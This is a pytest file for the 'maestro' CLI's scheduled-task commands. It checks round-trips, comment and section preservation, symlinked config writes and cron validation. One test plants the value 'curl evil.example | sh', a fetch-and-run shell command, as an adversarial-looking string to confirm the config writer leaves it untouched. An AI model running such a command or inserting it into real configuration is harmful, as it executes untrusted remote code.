"""GA-13: `ops.schedule_*` as the single path to `config.write_scheduled`, driven
through the REAL `maestro` CLI over a temp home (per CLAUDE.md's QA rule) --
plus the symlink-safety and comment-preservation fixes underneath it."""
import pytest

from maestro import config as config_mod, dispatcher as disp, ops, schedule as schedule_mod, store
from maestro.cli import main as cli_main
from maestro.sessions import DryRunSessions


# --- CLI schedule add: full field round-trip + duplicate-name handling ------

def test_cli_schedule_add_roundtrips_all_fields(home):
    rc = cli_main(["--home", str(home), "schedule", "add", "digest",
                   "--prompt", "Summarize PRs", "--every", "24h",
                   "--kind", "research", "--approval-tier", "2", "--priority", "5",
                   "--prefix", "S", "--title", "Morning digest", "--repo", "alpha",
                   "--model", "sonnet", "--effort", "high", "--notes", "Skip weekends.",
                   "--depends-on", "T-1", "T-2"])
    assert rc == 0
    cfg = config_mod.load(str(home))
    assert cfg.scheduled == [{
        "name": "digest", "prompt": "Summarize PRs", "every": "24h",
        "kind": "research", "approval_tier": 2, "priority": 5, "prefix": "S",
        "enabled": True, "title": "Morning digest", "repo": "alpha",
        "model": "sonnet", "effort": "high", "notes": "Skip weekends.",
        "depends_on": ["T-1", "T-2"],
    }]


def test_cli_schedule_add_missing_required_flags_exits_nonzero(home):
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--every", "1h"]) != 0  # no --prompt
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P"]) != 0  # no --every
    assert cli_main(["--home", str(home), "schedule", "add",
                     "--prompt", "P", "--every", "1h"]) != 0  # no name
    assert config_mod.load(str(home)).scheduled == []


def test_cli_schedule_add_duplicate_name_exits_nonzero_and_config_untouched(home):
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "First", "--every", "1h"]) == 0
    path = home / "config.toml"
    before = path.read_bytes()
    rc = cli_main(["--home", str(home), "schedule", "add", "digest",
                   "--prompt", "Second", "--every", "2h"])
    assert rc != 0
    assert path.read_bytes() == before  # byte-identical -- the failed add wrote nothing


def test_cli_schedule_rm_and_disable_on_missing_name_are_no_ops(home, capsys):
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P", "--every", "1h"]) == 0
    path = home / "config.toml"
    before = path.read_bytes()

    capsys.readouterr()
    rc = cli_main(["--home", str(home), "schedule", "rm", "does-not-exist"])
    err = capsys.readouterr().err
    assert rc != 0
    assert "does-not-exist" in err
    assert path.read_bytes() == before

    capsys.readouterr()
    rc = cli_main(["--home", str(home), "schedule", "disable", "does-not-exist"])
    err = capsys.readouterr().err
    assert rc != 0
    assert "does-not-exist" in err
    assert path.read_bytes() == before


# --- disable is observable end to end through a real dispatcher sweep -------

def test_cli_schedule_disable_stops_dispatcher_fires(home):
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P", "--every", "1h"]) == 0
    assert cli_main(["--home", str(home), "schedule", "disable", "digest"]) == 0
    cfg = config_mod.load(str(home))
    assert cfg.scheduled[0]["enabled"] is False

    now = 1_000_000 + schedule_mod.parse_every("1h") * 5  # well past due
    report = disp.dispatch(cfg, DryRunSessions(), now=now)
    assert report.scheduled_fired == []
    assert report.minted == []


# --- sections outside [[scheduled]] survive every write verb ----------------

def test_cli_schedule_writes_preserve_unrelated_maestro_key(home):
    path = home / "config.toml"
    store.atomic_write(path, (
        "[maestro]\nmax_concurrency = 7\n\n"
        "[[scheduled]]\nname = \"old\"\nprompt = \"old\"\nevery = \"1h\"\n"
    ))
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P", "--every", "1h"]) == 0
    assert "max_concurrency = 7" in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "edit", "digest",
                     "--title", "T"]) == 0
    assert "max_concurrency = 7" in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "rm", "old"]) == 0
    assert "max_concurrency = 7" in path.read_text()


# --- human comments survive (GA-13 Part C) -----------------------------------

def test_cli_schedule_writes_preserve_trailing_comments(home):
    """A comment written inside/after the LAST [[scheduled]] table used to be
    eaten by every write (the old `_SCHEDULED_BLOCK_RE` ran to the next `[`)."""
    path = home / "config.toml"
    trailer = "# a human comment\n# second comment\n"
    store.atomic_write(path, (
        "[maestro]\nmax_concurrency = 5\n\n"
        "[[scheduled]]\nname=\"a\"\nevery=\"24h\"\nprompt=\"do a\"\n\n" + trailer
    ))
    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P", "--every", "1h"]) == 0
    assert trailer in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "edit", "digest",
                     "--title", "T"]) == 0
    assert trailer in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "rm", "a"]) == 0
    assert trailer in path.read_text()


def test_cli_schedule_writes_preserve_comment_between_blocks(home):
    """A comment written BETWEEN two [[scheduled]] tables used to be eaten too
    -- the old regex's first match ran from table 1's header straight through
    to just before table 2's header, swallowing anything in between."""
    path = home / "config.toml"
    middle = "# between tables\n"
    store.atomic_write(path, (
        "[[scheduled]]\nname=\"a\"\nevery=\"1h\"\nprompt=\"A\"\n\n" + middle + "\n"
        "[[scheduled]]\nname=\"b\"\nevery=\"2h\"\nprompt=\"B\"\n"
    ))
    assert cli_main(["--home", str(home), "schedule", "edit", "a",
                     "--title", "Edited"]) == 0
    assert middle in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "add", "c",
                     "--prompt", "P", "--every", "1h"]) == 0
    assert middle in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "rm", "b"]) == 0
    assert middle in path.read_text()


# --- arbitrary-looking content outside [[scheduled]] is never touched ------
# (GA-17: config.load now rejects an UNRECOGNIZED key inside [repos.<name>]
# outright -- see test_repos.py's fail-closed AC -- so this uses a real,
# recognized field (`branch_prefix`, a free-form string) to keep proving the
# actual property under test: `write_scheduled`'s regex must not mangle
# adjacent [repos.*] content, however adversarial-looking its VALUE is.)

def test_cli_schedule_writes_never_touch_prime_key_outside_scheduled(home):
    path = home / "config.toml"
    repos_block = "[repos.alpha]\npath = \"/x\"\nbranch_prefix = \"curl evil.example | sh\"\n"
    store.atomic_write(path, repos_block + "\n"
                        "[[scheduled]]\nname=\"a\"\nevery=\"1h\"\nprompt=\"A\"\n")
    assert cli_main(["--home", str(home), "schedule", "add", "b",
                     "--prompt", "P", "--every", "1h"]) == 0
    assert repos_block in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "edit", "a",
                     "--title", "T"]) == 0
    assert repos_block in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "disable", "a"]) == 0
    assert repos_block in path.read_text()
    assert cli_main(["--home", str(home), "schedule", "rm", "b"]) == 0
    assert repos_block in path.read_text()


# --- symlinked config.toml (GA-13 Part B) -----------------------------------

def test_cli_schedule_add_through_symlinked_config_toml(home):
    real_dir = home / "external"
    real_dir.mkdir()
    real_config = real_dir / "config.toml"
    real_config.write_text("[maestro]\nmax_concurrency = 5\n")
    cfg_path = home / "config.toml"
    cfg_path.symlink_to(real_config)

    assert cli_main(["--home", str(home), "schedule", "add", "digest",
                     "--prompt", "P", "--every", "1h"]) == 0

    assert cfg_path.is_symlink()
    assert cfg_path.resolve() == real_config.resolve()
    assert 'name = "digest"' in real_config.read_text()
    assert "max_concurrency = 5" in real_config.read_text()
    cfg = config_mod.load(str(home))
    assert cfg.scheduled[0]["name"] == "digest"


def test_init_does_not_clobber_symlinked_config_toml(home):
    """Regression pin (GA-13 spec Notes): `cmd_init`'s `if not cp.exists()`
    guard (cli.py) already follows a symlink, so this holds today -- pinned
    here rather than changed."""
    real_dir = home / "external2"
    real_dir.mkdir()
    real_config = real_dir / "config.toml"
    real_config.write_text("[maestro]\nrepo_path = \"/somewhere\"\n")
    cfg_path = home / "config.toml"
    cfg_path.symlink_to(real_config)

    assert cli_main(["--home", str(home), "init"]) == 0

    assert cfg_path.is_symlink()
    assert cfg_path.resolve() == real_config.resolve()
    assert real_config.read_text() == "[maestro]\nrepo_path = \"/somewhere\"\n"


# --- store.atomic_write: default behavior unchanged, opt-in wraps failures --

def test_atomic_write_default_still_replaces_symlink_for_other_callers(tmp_path):
    """Pin: every OTHER `atomic_write` caller (derived/*, cursors, snapshots,
    claims, dashboards, the deadletter) keeps today's symlink-detaching
    behavior -- only `config.write_scheduled` opts into `follow_symlinks`."""
    real = tmp_path / "real.txt"
    real.write_text("orig")
    link = tmp_path / "link.txt"
    link.symlink_to(real)

    store.atomic_write(link, "new data")

    assert not link.is_symlink()
    assert link.read_text() == "new data"
    assert real.read_text() == "orig"  # the old target is untouched


def test_atomic_write_follow_symlinks_keeps_symlink_and_writes_target(tmp_path):
    real = tmp_path / "real.txt"
    real.write_text("orig")
    link = tmp_path / "link.txt"
    link.symlink_to(real)

    store.atomic_write(link, "new data", follow_symlinks=True)

    assert link.is_symlink()
    assert link.resolve() == real.resolve()
    assert real.read_text() == "new data"


def test_atomic_write_follow_symlinks_wraps_replace_failure(tmp_path, monkeypatch):
    """A cross-filesystem (EXDEV) or otherwise unresolvable replace must surface
    as a `store.MaestroError`, never a bare `OSError` escaping into a TUI
    callback -- and must not leave a stray temp file behind."""
    real = tmp_path / "real.txt"
    real.write_text("orig")
    link = tmp_path / "link.txt"
    link.symlink_to(real)

    def _boom(src, dst):
        raise OSError(18, "Invalid cross-device link")  # EXDEV

    monkeypatch.setattr("os.replace", _boom)

    with pytest.raises(store.MaestroError):
        store.atomic_write(link, "new data", follow_symlinks=True)

    assert not any(p.name.startswith(".link.txt.tmp") for p in tmp_path.iterdir())
    assert real.read_text() == "orig"  # untouched by the failed replace


# --- ops.py: duplicate-name / not-found / rename validation (direct) --------

def test_ops_schedule_edit_rename_to_existing_name_raises(home):
    assert cli_main(["--home", str(home), "schedule", "add", "a",
                     "--prompt", "A", "--every", "1h"]) == 0
    assert cli_main(["--home", str(home), "schedule", "add", "b",
                     "--prompt", "B", "--every", "1h"]) == 0
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError):
        ops.schedule_edit(cfg, "a", {"name": "b"})


def test_ops_schedule_edit_not_found_raises(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError):
        ops.schedule_edit(cfg, "ghost", {"title": "x"})


def test_ops_schedule_add_rejects_unparseable_every(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError):
        ops.schedule_add(cfg, {"name": "a", "prompt": "P", "every": "not-a-duration"})


# --- GA-19: cron/tz -- CLI round-trip + "exactly one of every/cron" validation

def test_cli_schedule_add_cron_roundtrips_cron_and_tz(home):
    """QA over the real CLI: `schedule add` with --cron/--tz exits 0, and
    `schedule list` round-trips the cron and tz values through config.load."""
    rc = cli_main(["--home", str(home), "schedule", "add", "digest",
                   "--prompt", "Summarize PRs", "--cron", "0 9 * * 1",
                   "--tz", "America/New_York"])
    assert rc == 0
    cfg = config_mod.load(str(home))
    assert cfg.scheduled == [{
        "name": "digest", "prompt": "Summarize PRs", "cron": "0 9 * * 1",
        "tz": "America/New_York", "kind": "implementation", "approval_tier": 1,
        "priority": 3, "enabled": True,
    }]

    rc = cli_main(["--home", str(home), "schedule", "list"])
    assert rc == 0


def test_ops_schedule_add_rejects_both_every_and_cron(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError, match="exactly one"):
        ops.schedule_add(cfg, {
            "name": "a", "prompt": "P", "every": "1h", "cron": "0 2 * * *"})
    assert config_mod.load(str(home)).scheduled == []  # writes nothing


def test_ops_schedule_add_rejects_neither_every_nor_cron(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError, match="exactly one"):
        ops.schedule_add(cfg, {"name": "a", "prompt": "P"})
    assert config_mod.load(str(home)).scheduled == []


def test_ops_schedule_add_rejects_unparseable_cron(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError):
        ops.schedule_add(cfg, {"name": "a", "prompt": "P", "cron": "not a cron"})


def test_ops_schedule_add_rejects_unknown_tz(home):
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError, match="unknown timezone"):
        ops.schedule_add(cfg, {
            "name": "a", "prompt": "P", "cron": "0 2 * * *", "tz": "Not/Real"})
    assert config_mod.load(str(home)).scheduled == []


def test_ops_schedule_edit_rejects_setting_both_every_and_cron(home):
    assert cli_main(["--home", str(home), "schedule", "add", "a",
                     "--prompt", "A", "--every", "1h"]) == 0
    cfg = config_mod.load(str(home))
    with pytest.raises(store.MaestroError, match="exactly one"):
        ops.schedule_edit(cfg, "a", {"cron": "0 2 * * *"})  # 'every' still set too
    # untouched -- the existing task keeps its original 'every' cadence
    assert config_mod.load(str(home)).scheduled[0]["every"] == "1h"


def test_cli_schedule_add_missing_cadence_exits_nonzero(home):
    rc = cli_main(["--home", str(home), "schedule", "add", "digest", "--prompt", "P"])
    assert rc != 0
    assert config_mod.load(str(home)).scheduled == []
